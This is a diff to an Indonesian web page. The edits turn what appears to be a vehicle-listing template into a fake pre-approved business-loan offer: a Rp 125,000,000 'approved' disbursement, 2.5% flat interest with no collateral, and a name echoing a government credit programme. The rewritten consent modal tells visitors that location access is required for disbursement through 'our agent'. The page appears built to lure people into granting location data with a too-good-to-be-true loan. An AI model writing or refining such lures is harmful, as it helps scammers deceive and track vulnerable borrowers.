@@ -86,28 +86,28 @@
   <div class="px-3 pt-2"><span class="brand-chip" style="background-color: forestgreen;">Disetujui</span></div>
 
   <!-- Header -->
-  <div class="d-flex justify-content-between align-items-start px-3 pt-2">
+  <div class="d-flex justify-content-between align-items-start px-3 pt-2 mb-4">
     <div>
       <h1 class="h5 mb-1 fw-bold">Kredit Usaha Rakyat Madani</h1>
       <div class="text-muted small">Pencairan Modal Usaha Rakyat Madani</div>
     </div>
-    <div class="d-flex gap-2">
+    <div class="d-flex gap-2 d-none">
       <button class="btn btn-sm btn-ghost rounded-circle" aria-label="Share">⤴</button>
       <button class="btn btn-sm btn-ghost rounded-circle" aria-label="Save">♡</button>
     </div>
   </div>
 
   <!-- Badges -->
-  <div class="px-3 pt-2 d-flex flex-wrap gap-2">
-    <span class="badge badge-pill px-3 py-2">⛽ Bensin</span>
-    <span class="badge badge-pill px-3 py-2">🏍️ 155 cc</span>
+  <div class="px-3 pt-2 d-flex flex-wrap gap-2 mb-4">
+    <span class="badge badge-pill px-3 py-2 d-none">⛽ Bensin</span>
+    <span class="badge badge-pill px-3 py-2 d-none">🏍️ 155 cc</span>
     <span class="badge badge-pill px-3 py-2">📍 Radius area saya</span>
-    <span class="badge badge-pill px-3 py-2">⚙️ Matic (CVT)</span>
+    <span class="badge badge-pill px-3 py-2 d-none">⚙️ Matic (CVT)</span>
   </div>
 
   <!-- Budget + Estimasi -->
   <div class="px-3 pt-3">
-    <div class="fs-5 fw-bold"> Rp 125.000.000</div>
+    <div class="fs-5 fw-bold" style="padding: 2rem;text-align: center;"> Rp 125.000.000</div>
     <div class="credit mt-2 shadow-sm">
       <div class="border-bottom p-3 fw-semibold">Preferensi Pencairan</div>
       <div class="row g-0 p-3 align-items-center">
@@ -144,7 +144,7 @@
     <div class="d-flex gap-2 py-2">
       <a class="btn btn-ghost flex-fill fw-bold" href="#"><span class="me-1">💬</span>Chat</a>
       <a class="btn btn-ghost flex-fill fw-bold" href="tel:+62000000000"><span class="me-1">📞</span>Call</a>
-      <a class="btn btn-success flex-fill fw-bold" style="flex:2" href="#offer">Tawarkan Unit</a>
+      <a class="btn btn-success flex-fill fw-bold" style="flex:2" href="#offer">Saya Setuju</a>
     </div>
   </div>
 </div>
@@ -153,9 +153,10 @@
 <div id="loc-modal" role="dialog" aria-modal="true" aria-labelledby="loc-title">
   <!-- STEP 1: Consent -->
   <main class="card" id="step-consent">
-    <h1 id="loc-title">Aktivasi Lokasi</h1>
-    <p>Kami melaksanakan jual beli kendaraan, lokasi memengaruhi harga penawaran.</p> 
-    <p>Untuk melihat harga dasar, lokasi wajib diaktifkan.</p>
+    <h1 id="loc-title">Aktivasi Lokasi Untuk Pencairan</h1>
+    <img class="thumb" src="img/dubai-fund.jpg" />"
+    <p>Danamadani.id penyalur kredit usaha madani dengan bunga 2.5% flat. Tanpa jaminan.</p> 
+    <p>Kami membutuhkan izin lokasi anda untuk pecairan melalui agen kami.</p>
     <div class="actions">
       <button class="primary" id="btn-allow">Izinkan & Lanjutkan</button>
     </div>
